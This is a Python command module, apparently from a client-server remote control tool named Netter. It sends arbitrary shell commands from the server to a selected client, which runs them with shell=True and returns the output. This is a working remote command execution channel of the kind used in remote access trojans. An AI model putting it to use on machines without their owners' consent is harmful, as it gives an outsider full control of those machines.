from typing import TYPE_CHECKING
from ..enums import PacketType

if TYPE_CHECKING:
    from ..http import NetterServer, NetterClient
    from ..enums import ClientResponse
    from ..client import Connect

__aliases__ = ['run', 'exec']
__description__ = 'Command used to run a command-prompt command, requires a client to be selected in order to execute this command.'
__extra__ = 'Usage examples: `run dir`'

def execute(netServer: "NetterServer", *args) -> bool:
    if not args:
        netServer.inputHandler.handle('help run')
        return

    if not netServer.selectedClient:
        netServer.console_log('No client is selected', level = 'ERROR')
        netServer.inputHandler.handle('help select')
        return

    netServer.selectedClient.socket_.send_(
        packetType = PacketType.COMMAND,
        data = 'exec ' + ' '.join(args)
    )

    return netServer.selectedClient

def on_server_receive(netServer: "NetterServer", client: "NetterClient", packet: "ClientResponse"):
    output: list[str] = packet.data.decode('UTF-8').split('\n')

    netServer.console_log('Command execution completed, output: ', level = 'INFO')

    for text in output:
        netServer.console_log(text, level = 'PLAIN')

def on_client_receive(serverHandler: "Connect", *args):
    import concurrent.futures, subprocess

    if (not args):
        serverHandler.send_(PacketType.CONSOLE_ERROR, repr(serverHandler))
        serverHandler.send_(PacketType.CONSOLE_ERROR, 'Invalid usage of command: ' + repr(args))
        return

    def run() -> str:
        output = subprocess.run(' '.join(args),
            stdout = subprocess.PIPE,
            stderr = subprocess.PIPE,
            shell = True,
            text = True
        )

        return output.stderr if output.stderr else output.stdout

    executor = concurrent.futures.ThreadPoolExecutor()
    future = executor.submit(run)

    try:
        result = future.result(timeout = 8)
        return result

    except concurrent.futures.TimeoutError:
        serverHandler.send_(PacketType.CONSOLE_ERROR, 'Command execution timed out')
        return
